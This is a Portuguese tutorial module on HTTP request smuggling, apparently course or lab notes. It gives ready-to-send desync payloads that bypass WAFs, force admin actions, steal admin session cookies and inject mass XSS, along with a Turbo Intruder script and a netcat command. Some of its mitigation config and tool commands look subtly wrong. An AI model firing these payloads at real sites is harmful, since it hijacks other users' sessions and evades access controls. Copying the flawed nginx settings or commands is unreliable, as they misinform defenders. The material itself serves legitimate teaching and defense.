---
title: "Request Smuggling"
---

# O que é?

HTTP Request Smuggling (também chamado de Desync Attack) é um ataque que explora discrepâncias na interpretação de fronteiras de requisições HTTP entre diferentes servidores na chain de processamento — tipicamente um servidor frontend (load balancer, reverse proxy, CDN, WAF) e um servidor backend (application server).

O ataque "contrabandeia" o início de uma nova requisição HTTP dentro do corpo de outra. A ideia central: quando dois servidores discordam sobre onde uma requisição termina, bytes que o frontend interpreta como corpo de uma requisição são interpretados pelo backend como o início de uma nova requisição — e essa nova requisição nunca passou pelos controles de segurança do frontend.

O ataque foi descoberto originalmente por Watchfire em 2005, mas ganhou atenção e técnicas de exploração modernas com o trabalho de James Kettle (PortSwigger/Burp Suite) publicado na DEF CON 2019. Kettle demonstrou que a vulnerabilidade era muito mais prevalente e explorável do que se pensava, afetando infraestruturas de grandes empresas como Google, Amazon e outros.

A ambiguidade explorada está na coexistência de dois mecanismos igualmente válidos em HTTP/1.1 para delimitar o corpo de uma requisição:

**Content-Length (CL)**: especifica o tamanho exato em bytes do corpo. Direto e simples.

**Transfer-Encoding: chunked (TE)**: corpo transmitido em chunks. Cada chunk é precedido pelo seu tamanho em hexadecimal seguido de CRLF. Um chunk de tamanho zero indica o fim do corpo.

A RFC 7230 especifica que quando ambos os headers estão presentes, `Transfer-Encoding` deve ter precedência e `Content-Length` deve ser ignorado ou removido. O problema é que diferentes implementações de servidores e proxies não seguem essa regra de forma uniforme — alguns ignoram TE, outros ignoram CL, outros interpretam TE de forma diferente. Essa inconsistência é o fundamento do ataque.

O impacto é amplo: ao contrário de injeções de parâmetro que afetam uma requisição específica, request smuggling afeta todos os usuários da aplicação. Um único payload malicioso pode comprometer a próxima requisição de qualquer usuário, incluindo administradores autenticados.

---

# Onde é implementado?

HTTP Request Smuggling afeta qualquer infraestrutura web com múltiplas camadas de processamento HTTP. Em arquiteturas modernas, é raro que uma requisição HTTP seja processada por apenas um servidor — praticamente toda produção web envolve pelo menos dois servidores HTTP no caminho.

**CDN (Content Delivery Network) → Origin Server**: Cloudflare, Fastly, Akamai, AWS CloudFront atuam como proxy reverso para servidores de origem. A requisição passa pelo edge do CDN (que pode normalizar ou modificar headers) antes de chegar ao servidor de origem. Discrepâncias entre o parsing do CDN e do servidor de origem criam o vetor.

**Load Balancer → Application Server**: AWS ALB (Application Load Balancer), nginx como load balancer, HAProxy, F5 BIG-IP. O load balancer processa e distribui requisições para múltiplos backends. Se o load balancer e o backend têm interpretações diferentes de CL vs TE, o ataque é possível.

**Reverse Proxy → Upstream**: nginx como proxy reverso para gunicorn (Python), Apache mod_proxy para Tomcat (Java), Caddy para Node.js. Combinações comuns em produção onde o proxy web serve TLS e redireciona para o application server em HTTP.

**WAF (Web Application Firewall) → Backend**: WAFs em modo inline/proxy (ModSecurity, AWS WAF, Imperva) inspecionam o tráfego antes de repassá-lo ao backend. Se o WAF e o backend discordam sobre os limites das requisições, o ataque pode ser usado para contornar as proteções do WAF completamente.

Exemplos de combinações vulneráveis observadas em produção:
- **nginx + gunicorn**: nginx usa CL, gunicorn usa TE (CL.TE)
- **HAProxy + Apache**: variações dependendo da versão e configuração
- **AWS ALB + EC2 (Apache/nginx)**: ALB tem comportamento específico em versões antigas
- **Cloudflare + origin server**: edge Cloudflare pode ter parsing diferente do servidor de origem
- **nginx (proxy) + Node.js**: dependendo de como o Node.js HTTP parser interpreta TE

O ataque é especialmente relevante em ambientes onde HTTP/2 é terminado no proxy mas o backend ainda usa HTTP/1.1 — o downgrade de HTTP/2 para HTTP/1.1 cria novos vetores (H2.CL, H2.TE) que podem existir mesmo quando CL.TE e TE.CL estão mitigados.

---

# Como funciona de forma adequada?

## HTTP/1.1 e Proxies — O Design Original

HTTP/1.1 foi projetado assumindo que proxies são transparentes — eles encaminham requisições sem alterar semântica. O mecanismo de keep-alive (conexões persistentes) permite múltiplas requisições na mesma conexão TCP, o que melhora performance mas cria o requisito de delimitar onde cada requisição termina.

```
Cliente                    Proxy/Load Balancer              Backend
   |                              |                             |
   |-- Conexao TCP keepalive ---->|-- Conexao TCP keepalive --->|
   |                              |                             |
   |-- GET /page1 HTTP/1.1 ------>|-- GET /page1 HTTP/1.1 ----->|
   |                              |                             |
   |-- GET /page2 HTTP/1.1 ------>|-- GET /page2 HTTP/1.1 ----->|
   |                              |                             |
   |  (mesma conexao TCP)         |  (mesma conexao TCP)        |
   |                              |                             |
   |<-- HTTP/1.1 200 OK ----------|<-- HTTP/1.1 200 OK ---------|
   |<-- HTTP/1.1 200 OK ----------|<-- HTTP/1.1 200 OK ---------|
```

O problema de delimitação: sem um separador explícito entre requisições, como o servidor sabe onde uma termina e a próxima começa? HTTP/1.1 usa os headers para isso.

## Content-Length e Transfer-Encoding — Mutuamente Exclusivos por Spec

A RFC 7230 (HTTP/1.1 Message Syntax and Routing) define claramente:

> "If a message is received that has multiple Content-Length header fields with field-values consisting of the same decimal value, or a single Content-Length header field with a field value containing a list of identical decimal values (e.g., 'Content-Length: 42, 42'), the recipient MUST either reject the message as invalid or replace that duplicated field-value with a single valid Content-Length field containing that decimal value prior to determining the message body length or forwarding the message."

> "If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling and OUGHT to be handled as an error."

Em outras palavras: CL e TE são mutuamente exclusivos. Uma requisição bem-formada tem apenas um deles. A spec diz que servidores DEVERIAM rejeitar requisições com ambos. O problema é que "ought to be handled as an error" não é obrigatório — e na prática, a maioria dos servidores tenta processar a requisição de qualquer forma, resultando em comportamentos inconsistentes.

## Chunked Transfer Encoding Correto — Como Deveria Funcionar

Chunked encoding foi projetado para transmitir dados sem saber o tamanho total antecipadamente (streaming). O formato correto:

```
POST /upload HTTP/1.1
Host: exemplo.com
Transfer-Encoding: chunked
Content-Type: application/octet-stream

1a
Este e o primeiro chunk
b
Segundo chunk
0

```

Anatomia de cada chunk:
```
<tamanho em hex>\r\n
<dados do chunk>\r\n
...
0\r\n
\r\n     <- linha vazia indica fim dos trailers (se houver)
```

O chunk zero (`0\r\n\r\n`) sinaliza o fim do corpo. Qualquer dado após ele pertence à próxima requisição na conexão keep-alive — e é exatamente aí que o smuggling ocorre.

## HTTP/2 — Como Elimina o Problema

HTTP/2 (RFC 7540) adota framing binário em vez de texto, eliminando a ambiguidade de delimitação:

```
Requisicao HTTP/1.1 (texto, ambiguo):
   POST / HTTP/1.1\r\n
   Content-Length: 10\r\n
   Transfer-Encoding: chunked\r\n
   \r\n
   0\r\n
   \r\nHELLO

Requisicao HTTP/2 (frames binarios, sem ambiguidade):
   [HEADERS frame: method=POST, path=/, ...]
   [DATA frame: length=5, END_STREAM=true, data=HELLO]
```

Em HTTP/2:
- Cada frame tem um campo de tamanho embutido no header do frame (24 bits)
- Não existe Transfer-Encoding: chunked — o protocolo já tem seu próprio framing
- Não existe Content-Length ambíguo — o tamanho é determinado pelos frames DATA
- Streams são multiplexados e identificados por stream ID — sem ambiguidade de fronteiras

O problema retorna quando há downgrade: se o proxy fala HTTP/2 com o cliente mas converte para HTTP/1.1 ao falar com o backend, o proxy precisa traduzir o framing binário para o formato texto — e essa tradução pode introduzir inconsistências exploráveis (H2.CL, H2.TE).

## Proxy Bem-Configurado — O Que Deveria Acontecer

```
Requisicao ambigua (CL + TE simultaneos):
   POST / HTTP/1.1
   Content-Length: 10
   Transfer-Encoding: chunked

Comportamento correto do proxy (RFC 7230):
   -> Detectar presenca simultanea de CL e TE
   -> Retornar 400 Bad Request ao cliente
   -> Nao encaminhar a requisicao ao backend
   -> Logar o evento como potencial tentativa de smuggling

Comportamento vulneravel do proxy:
   -> Processar usando apenas CL (ignorar TE)
   -> Encaminhar ao backend que usa TE
   -> Backend interpreta fronteiras diferentes
   -> Smuggling bem-sucedido
```

A solução definitiva é usar HTTP/2 de ponta a ponta (proxy e backend), ou — se HTTP/1.1 for necessário no backend — configurar o proxy para rejeitar qualquer requisição com ambos os headers presentes e fechar a conexão TCP (não apenas retornar erro, pois bytes já no buffer podem ser reprocessados).

---

# HTTP Request Smuggling / Desync Attacks

## A Falha: Ambiguidade na Interpretação de Limites de Requisição HTTP

HTTP Request Smuggling (tambem chamado de Desync Attack) explora discrepancias entre como sistemas intermediarios (reverse proxies, load balancers, WAFs) e o servidor web backend interpretam onde uma requisicao HTTP termina e a proxima comeca.

A suposicao de design errada: o desenvolvedor assume que o reverse proxy e o servidor backend concordam sobre o que constitui uma requisicao. Na realidade, HTTP/1.1 define dois mecanismos igualmente validos para delimitar o corpo de uma requisicao — `Content-Length` e `Transfer-Encoding: chunked` — e o comportamento quando ambos estao presentes simultaneamente e indefinido na especificacao.

**Perspectiva do frontend vs. do backend:**

Quando o frontend (WAF ou load balancer) usa `Content-Length` para determinar onde a requisicao termina, mas o backend usa `Transfer-Encoding: chunked`, eles "enxergam" limites diferentes nos mesmos bytes. O frontend processa uma requisicao, aplica seus controles de seguranca, e encaminha ao backend. O backend ve bytes diferentes como o inicio de uma nova requisicao — que nao passou pelos controles de seguranca do frontend.

**Consequencia antes de ver a exploracao:** o atacante consegue "prependar" dados ao inicio do proximo request de qualquer outro usuario. O frontend processou o request original sem problemas, mas o backend vai juntar os bytes do atacante com o request da vitima. Isso permite injetar cabecalhos HTTP na requisicao da vitima, forcando o servidor a executar acoes autenticadas com as credenciais da vitima.

Diferente de ataques a parametros isolados, request smuggling afeta TODOS os usuarios da aplicacao simultaneamente. Basta um request malicioso que cause desync para que o proximo request de qualquer usuario seja manipulado.

Ambientes tipicamente vulneraveis:
- Aplicacoes com reverse proxy (Nginx, HAProxy, AWS ALB) na frente de servidor web
- CDNs que reescrevem requests
- WAFs em modo reverse proxy
- Ambientes com HTTP/2 downgrading (cliente fala HTTP/2, proxy converte para HTTP/1.1)

---

## Causa Raiz

O problema esta na especificacao HTTP/1.1 (RFC 7230): quando `Content-Length` e `Transfer-Encoding` estao ambos presentes, `Transfer-Encoding` tem precedencia e `Content-Length` deve ser ignorado. Mas diferentes implementacoes de servidores e proxies interpretam essa regra de forma inconsistente ou a ignoram completamente.

```nginx
# VULNERAVEL — nginx na frente de gunicorn: nginx usa CL, gunicorn usa TE
# Nenhum deles esta "errado" individualmente, mas o par cria o desync

upstream backend {
    server 127.0.0.1:8000;
}

# MITIGACAO — rejeitar requests com ambos os headers
if ($http_transfer_encoding) {
    return 400 "Ambiguous request";
}

# MITIGACAO SUPERIOR — usar HTTP/2 de ponta a ponta (elimina TE ambiguidade)
location / {
    proxy_http_version 2.0;
    proxy_pass http://backend;
}
```

O que falta em cada cenario:

- **CL.TE:** o proxy nao valida se suporta `Transfer-Encoding` e cai para `Content-Length`
- **TE.CL:** o servidor backend nao suporta chunked encoding mas nao rejeita o header
- **TE.TE:** um dos lados aceita `Transfer-Encoding` obfuscado e o outro nao, criando discrepancia

A solucao definitiva e usar HTTP/2 de ponta a ponta, que elimina a ambiguidade porque usa frames binarios com tamanho embutido, sem os dois mecanismos concorrentes do HTTP/1.1.

---

## Ambiguidade CL vs TE e Tipos de Desync em Cadeia de Proxies

### Fundamentos — TCP Stream e HTTP/1.1

HTTP/1.1 permite reutilizacao de conexoes TCP (keep-alive). Multiplos requests sao enviados na mesma conexao TCP sem separador entre eles. O servidor precisa saber onde um request termina e o proximo comeca.

Dois mecanismos definem o tamanho do corpo:

**Content-Length (CL):** Especifica o tamanho em bytes

```
POST / HTTP/1.1
Host: site.htb
Content-Length: 29

param1=HelloWorld&param2=Test
```

**Transfer-Encoding: chunked (TE):** Corpo em chunks com tamanho em hex + CRLF + dados + CRLF

```
POST / HTTP/1.1
Host: site.htb
Transfer-Encoding: chunked

1d
param1=HelloWorld&param2=Test
0

```

**Regra RFC:** Se ambos CL e TE estiverem presentes, TE tem precedencia e CL deve ser ignorado.

O problema: sistemas diferentes nao seguem essa regra uniformemente, ou implementam chunked encoding de forma diferente.

### Tipos de Request Smuggling

#### CL.TE — Proxy usa CL, Servidor usa TE

O reverse proxy NAO suporta chunked encoding, usa CL. O servidor web usa TE corretamente.

**Payload:**

```
POST / HTTP/1.1
Host: clte.htb
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```

- Proxy ve CL=10, le `0\r\n\r\nHELLO` (10 bytes), encaminha tudo
- Servidor ve TE=chunked, le ate o chunk vazio `0\r\n\r\n` (4 bytes = fim do request)
- Bytes `HELLO` ficam no buffer TCP como inicio do proximo request
- Proximo request que chegar tem `HELLO` prefixado — HELLOGET / HTTP/1.1

#### TE.CL — Proxy usa TE, Servidor usa CL

O reverse proxy suporta chunked encoding. O servidor web usa CL.

**Payload:**

```
POST / HTTP/1.1
Host: tecl.htb
Content-Length: 3
Transfer-Encoding: chunked

5
HELLO
0

```

- Proxy ve TE=chunked, le todos os chunks ate `0` (fim), encaminha tudo
- Servidor ve CL=3, le apenas `5\r\n` (3 bytes), termina o request
- Bytes restantes `HELLO\r\n0\r\n\r\n` ficam no buffer como inicio do proximo request
- Proximo request que chegar tem `HELLO` prefixado

#### TE.TE — Ambos usam TE, mas um rejeita TE obfuscado

Quando proxy e servidor ambos suportam chunked encoding, pode-se obfuscar o header TE para que apenas um deles o aceite, efetivamente criando um cenario CL.TE.

Tecnicas de obfuscacao do header TE:

| Descricao | Header |
|---|---|
| Substring match | `Transfer-Encoding: testchunked` |
| Espaco no nome | `Transfer-Encoding : chunked` |
| Horizontal Tab | `Transfer-Encoding:[\x09]chunked` |
| Vertical Tab | `Transfer-Encoding:[\x0b]chunked` |
| Leading space | `<br> Transfer-Encoding: chunked<br>` |

Se o proxy ignorar o TE obfuscado e cair para CL, o comportamento e identico ao CL.TE.

### CRLF Injection

CRLF = Carriage Return (`\r`, 0x0D) + Line Feed (`\n`, 0x0A)

Em HTTP/1.1, CRLF separa headers. Injetar CRLF em um header permite adicionar headers extras ou manipular o response.

**URL encoding:** `\r\n` = `%0d%0a` = `%0D%0A`

**Log Injection:** CRLF em campos logados cria entradas falsas no log:

```
POST /contact.php HTTP/1.1
name=testuser&message=test1'%0d%0aFake+log+entry
```

**HTTP Response Splitting:** CRLF em header que e refletido pelo servidor:

```
GET /?target=http://legit.com%0d%0aTest:%20injected HTTP/1.1
```

Response incluira `Test: injected` como header separado.

**XSS via Response Splitting:**

```
GET /?target=%0d%0a%0d%0a<html><script>alert(1)</script></html> HTTP/1.1
```

Dois CRLFs separam headers do body — XSS executado.

**SMTP Header Injection:** Email address refletido em headers SMTP:

```
email=evil@attacker.htb%0d%0aCc:%20victim@target.com
```

### HTTP/2 e Downgrading

HTTP/2 e um protocolo binario que elimina request smuggling tradicional porque:
- Sem encoding chunked
- Comprimento determinado por frames binarios com tamanho embutido

Porem, em deployments onde o usuario fala HTTP/2 com o proxy mas o proxy converte para HTTP/1.1 para o servidor (HTTP/2 downgrading), surgem novos vetores:

**H2.CL:** Request HTTP/2 com CL header incorreto. Proxy confia no CL e o inclui no HTTP/1.1 reescrito:

```
:method POST
:path /
:authority http2.htb
:scheme http
content-length 0
GET /smuggled HTTP/1.1
Host: http2.htb
```

Proxy reescreve para HTTP/1.1 com CL=0 — o GET smuggled aparece como request separado.

**H2.TE:** Request HTTP/2 com Transfer-Encoding: chunked. RFC proibe isso em HTTP/2, mas proxy vulnerable aceita e encaminha para HTTP/1.1:

```
:method POST
:path /
:authority http2.htb
:scheme http
transfer-encoding chunked
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

**Request Header Injection:** Header HTTP/2 cujo VALOR contem CRLF:

```
:method POST
:path /
:authority http2.htb
:scheme http
dummy asd\r\nTransfer-Encoding: chunked
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

O proxy nao valida CRLF em valores de headers HTTP/2. Ao reescrever para HTTP/1.1, o CRLF cria um novo header `Transfer-Encoding: chunked`.

**Header Name Injection:** Header HTTP/2 cujo NOME contem CRLF:

```
:method POST
dummy: asd\r\nTransfer-Encoding chunked
0

GET /smuggled HTTP/1.1
```

**Request Line Injection:** CRLF no pseudo-header `:method`:

```
:method POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nDummy: asd
:path /
:authority http2.htb
:scheme http
0
```

---

## Identificacao

### Confirmar CL.TE

Usar dois requests em sequencia via mesma conexao TCP:

**Request 1 (cria desync):**

```
POST / HTTP/1.1
Host: clte.htb
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```

**Request 2 (confirmar impacto):**

```
GET / HTTP/1.1
Host: clte.htb

```

Se o segundo request retornar HTTP 405 Method Not Allowed ou erro inesperado, o request 1 influenciou o request 2 — CL.TE confirmado.

Razao: o servidor prepende `HELLO` ao segundo request, transformando o metodo de `GET` para `HELLOGET`, que e invalido.

### Confirmar TE.CL

Dois requests enviados na mesma conexao:

**Request 1:**

```
POST / HTTP/1.1
Host: tecl.htb
Content-Length: 3
Transfer-Encoding: chunked

5
HELLO
0

```

**Request 2:**

```
GET / HTTP/1.1
Host: tecl.htb

```

Se Request 2 retornar `Bad Request` mencionando `HELLO`, confirmado TE.CL.

### Confirmar TE.TE

Substituir o espaco antes de `chunked` por `\x09` (tab horizontal) usando Hex editor do Burp Repeater:

```
Transfer-Encoding:[0x09]chunked
```

Enviar duas vezes rapidamente. Se o segundo request retornar 405, TE.TE confirmado (proxy ignora TE obfuscado e cai para CL).

### Gunicorn Bug (Software Vulneravel)

Gunicorn 20.0.4 contem bug: header `Sec-Websocket-Key1` fixa o tamanho do corpo em 8 bytes independente do CL/TE. Permite criar desync sem precisar de CL/TE discrepancia.

```
GET / HTTP/1.1
Host: gunicorn.htb
Content-Length: 49
Sec-Websocket-Key1: x

xxxxxxxxGET /404 HTTP/1.1
Host: gunicorn.htb
```

O servidor le apenas 8 bytes (`xxxxxxxx`) como corpo. Os 41 bytes restantes (`GET /404...`) ficam no buffer como novo request.

---

## Exploitation

### Bypass de WAF (CL.TE)

Cenario: WAF bloqueia requests contendo `admin` na URL.

**Payload para smugglar request para `/admin`:**

```
POST / HTTP/1.1
Host: vuln.htb
Content-Length: 64
Transfer-Encoding: chunked

0

POST /admin.php?reveal_flag=1 HTTP/1.1
Host: vuln.htb
Dummy:
```

- WAF ve apenas um POST para `/` — nao contem `admin`, nao bloqueia
- Servidor ve dois requests: POST `/` e POST `/admin.php?reveal_flag=1`
- A linha `Dummy:` e necessaria para absorver a primeira linha do proximo request sem quebrar a sintaxe HTTP

### Bypass de WAF (TE.CL)

Cenario: WAF usa TE para determinar limites, servidor usa CL.

**Dois requests via mesma conexao TCP:**

Request 1:

```
GET /404 HTTP/1.1
Host: tecl.htb
Content-Length: 4
Transfer-Encoding: chunked

27
GET /admin HTTP/1.1
Host: tecl.htb

0

```

Request 2:

```
GET /404 HTTP/1.1
Host: tecl.htb

```

- WAF usa TE: ve dois GETs para `/404` — sem admin, nao bloqueia
- Servidor usa CL=4: primeiro request termina apos `27\r\n`, o resto (`GET /admin...`) e o novo request
- Segundo request do servidor = GET /admin com resposta 200

### Forca Admin a Executar Acao (CL.TE)

Cenario: Queremos que o admin promova nosso usuario (uid=2) para admin via `/admin.php?promote_uid=2`.

**Payload:**

```
POST / HTTP/1.1
Host: clte.htb
Content-Length: 52
Transfer-Encoding: chunked

0

POST /admin.php?promote_uid=2 HTTP/1.1
Dummy:
```

Quando o admin faz qualquer request, o servidor recebe:

```
POST /admin.php?promote_uid=2 HTTP/1.1
Dummy: GET / HTTP/1.1
Host: clte.htb
Cookie: sess=<admin_session_cookie>
```

O servidor ve um POST `/admin.php?promote_uid=2` autenticado com a sessao do admin.

A linha `Dummy:` absorve a primeira linha do request do admin como valor do header, preservando sintaxe HTTP valida.

### Roubo de Dados de Usuario (Stealing Session Cookie)

Cenario: Aplicacao tem secao de comentarios. Queremos roubar o cookie de sessao do admin.

```
POST / HTTP/1.1
Host: stealingdata.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Transfer-Encoding: chunked

0

POST /comments.php HTTP/1.1
Host: stealingdata.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

name=hacker&comment=test
```

Mecanismo:
1. Proxy (CL) ve: POST `/` com corpo ate `Dummy:`, e GET do admin
2. Servidor (TE) ve: POST `/` terminando no chunk vazio, e POST `/comments.php` com corpo expandido
3. O corpo do POST `/comments.php` tem CL=300, mas so temos `name=hacker&comment=test`
4. Servidor espera mais dados — o request do admin e absorvido como corpo do comentario
5. Comentario postado contem o request completo do admin incluindo seu Cookie de sessao

Verificar na secao de comentarios: o request do admin aparece como texto, com o cookie visivel.

**Dicas importantes:**
- CL=300 deve ser grande o suficiente para capturar dados do admin, mas nao tao grande que cause timeout
- Adicionar todos os headers necessarios no request smuggled (Content-Type obrigatorio para POST)
- Enviar o request uma vez e aguardar sem enviar mais requests

### Mass XSS via Request Smuggling

Cenario: Header customizado `Vuln` e refletido na resposta (XSS refletido em header — impossivel de explorar normalmente).

```
POST / HTTP/1.1
Host: vuln.htb
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Vuln: "><script>alert(1)</script>
Dummy:
```

O proximo request da vitima e processado com o header `Vuln` injetado. A resposta contem o payload XSS que o browser da vitima executa.

### H2.CL — Bypass WAF com HTTP/2

No Burp Repeater, mudar protocolo para HTTP/2 e desabilitar `Update Content-Length`:

```
POST /index.php HTTP/2
Host: http2.htb
Content-Length: 0

POST /index.php?reveal_flag=1 HTTP/1.1
Foo:
```

O WAF ve um POST `/index.php` — sem parametros suspeitos.
O servidor (HTTP/1.1) ve dois requests: o original e o smuggled com `reveal_flag=1`.

---

## Ferramentas

### Burp Suite — HTTP Request Smuggler Extension

```
# Instalar via BApp Store:
Extensions -> BApp Store -> buscar "HTTP Request Smuggler" -> Install

# Funcionalidades:
# 1. Convert to chunked
#    Click direito no request -> Extensions -> HTTP Request Smuggler -> Convert to chunked

# 2. Smuggle attack (CL.TE)
#    Click direito -> Extensions -> HTTP Request Smuggler -> Smuggle attack (CL.TE)
#    Abre Turbo Intruder com script pre-configurado

# 3. Smuggle attack (TE.CL)
#    Click direito -> Extensions -> HTTP Request Smuggler -> Smuggle attack (TE.CL)
```

**Turbo Intruder para exploracoes automatizadas:**

```python
# Script exemplo para CL.TE
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=5,
                          requestsPerConnection=1,
                          resumeSSL=False,
                          timeout=10,
                          pipeline=False,
                          maxRetriesPerRequest=0,
                          engine=Engine.THREADED)

    # Request com payload smuggled
    prefix = 'GET /admin.php HTTP/1.1\r\nX-Ignore: X'
    
    attack = target.req.replace('param1=HelloWorld', f'param1=HelloWorld\r\n\r\n{prefix}')
    engine.queue(attack)
    
    # Requests de vitima
    for i in range(14):
        engine.queue(target.req)
    
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

### Burp Suite — Tab Groups para TE.CL

Para enviar requests na mesma conexao TCP:

```
1. Click direito na aba do Repeater -> Add tag to group -> Create tab group
2. Adicionar segundo request ao mesmo grupo
3. Desmarcar "Update Content-Length" em cada aba
4. Click na seta ao lado de Send -> Send group in sequence (single connection)
```

### CRLFsuite

```bash
# Instalar
pip3 install crflsuite

# Escanear URL por CRLF injection
crflsuite -t http://127.0.0.1:8000/?target=asd

# Com proxy Burp
crflsuite -t http://target.htb/?param=asd --proxy http://127.0.0.1:8080

# Verbose
crflsuite -t http://target.htb/?param=asd -v 3

# Especificar metodo
crflsuite -t http://target.htb/ -m POST -d "param=value"
```

### Ferramentas Manuais

```bash
# Enviar request raw com netcat (para controle total)
printf "POST / HTTP/1.1\r\nHost: target.htb\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nHELLO" | nc -q 5 target.htb 80

# Verificar se conexao e reutilizada
curl -v --http1.1 -K- <<< "url = http://target.htb/" --next "url = http://target.htb/"
```

---

## Detecção e Mitigação

### Sinais de Ataque nos Logs

```bash
# Requests com CL e TE simultaneos
grep -E "Content-Length.*Transfer-Encoding|Transfer-Encoding.*Content-Length" /var/log/nginx/access.log

# Metodos HTTP invalidos nos logs (sinal de desync)
grep -E "\"HELLOGET |\"XGET |\"0GET " /var/log/nginx/access.log

# Requests para /admin vindo de IPs nao autorizados
grep "/admin" /var/log/nginx/access.log | grep -v "10.0.0."

# Erros 400/405 frequentes (proxy desync)
awk '$9 == "405" || $9 == "400" {print}' /var/log/nginx/access.log | sort | uniq -c | sort -rn
```

### Prevencao

**1. Usar HTTP/2 de ponta a ponta:**

```nginx
# nginx.conf
upstream backend {
    server 127.0.0.1:8080;
    keepalive 32;
}

server {
    listen 443 ssl http2;
    
    location / {
        proxy_http_version 2.0;  # Se o backend suportar
        proxy_pass http://backend;
    }
}
```

**2. Normalizar requests no proxy:**

```nginx
# Rejeitar requests com ambos CL e TE
if ($http_transfer_encoding) {
    return 400;
}
```

**3. Fechar conexao TCP apos erros:**

```nginx
# Configurar para fechar conexao em caso de erro de parsing
proxy_ignore_client_abort off;
reset_timedout_connection on;
```

**4. Atualizar software regularmente:**

```bash
# Verificar versao do Gunicorn
pip show gunicorn | grep Version
# Versao 20.0.4 vulneravel ao Sec-Websocket-Key1 bug
# Atualizar para > 20.1.0

# Verificar CVEs do servidor web em uso
pip audit
apt list --upgradable | grep -i "nginx\|gunicorn\|apache"
```

**5. Desabilitar reuso de conexao no proxy para backend:**

```nginx
# nginx — nova conexao por request (overhead mas elimina smuggling)
proxy_http_version 1.0;
proxy_set_header Connection close;
```

---

## Módulos Relacionados

`02_http_misconfigs.md` cobre headers HTTP processados sem validação (Host, X-Forwarded-For, Cache), que combinam com smuggling para ampliar o impacto do ataque. `03_tls_https_attacks.md` explora o downgrade de protocolo como vetor similar de ambiguidade na negociação de versão. `../11_apis_avancado/01_rest_api_attacks.md` demonstra como bypass de rate limiting em APIs pode ser alcançado via manipulação de headers encaminhados por proxies.
